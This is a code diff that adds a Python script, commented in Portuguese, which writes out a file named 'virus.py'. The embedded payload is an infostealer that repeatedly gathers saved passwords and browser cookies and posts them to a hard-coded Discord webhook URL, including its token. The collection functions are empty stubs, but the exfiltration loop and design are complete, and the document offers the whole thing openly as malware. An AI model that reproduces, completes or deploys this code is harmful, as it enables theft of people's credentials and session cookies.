@@ -1,0 +1,50 @@
+import requests
+import time
+
+# Define o URL do webhook do Discord
+webhook_url = "https://discord.com/api/webhooks/1459892256084594792/UCjUu_FmaK-p8bK5xr9GW4Q-RWgrar7lNhdH-o40aDYYegdf0O3TsnzBajQdUDubsKT9"
+
+# Define o conteúdo do vírus
+virus_content = """
+import requests
+import time
+
+def send_data():
+    # Pega as senhas salvas
+    passwords = get_passwords()
+    
+    # Pega os cookies
+    cookies = get_cookies()
+    
+    # Envia os dados para o webhook do Discord
+    data = {
+        "passwords": passwords,
+        "cookies": cookies
+    }
+    response = requests.post(webhook_url, json=data)
+    
+    # Verifica se a requisição foi bem-sucedida
+    if response.status_code == 200:
+        print("Dados enviados com sucesso!")
+    else:
+        print("Falha ao enviar dados.")
+
+def get_passwords():
+    # Implemente a função para pegar as senhas salvas
+    pass
+
+def get_cookies():
+    # Implemente a função para pegar os cookies
+    pass
+
+# Loop principal
+while True:
+    send_data()
+    time.sleep(300)  # Espera 5 minutos antes de enviar novamente
+"""
+
+# Cria o arquivo do vírus
+with open("virus.py", "w") as f:
+    f.write(virus_content)
+
+print("Vírus criado: virus.py")
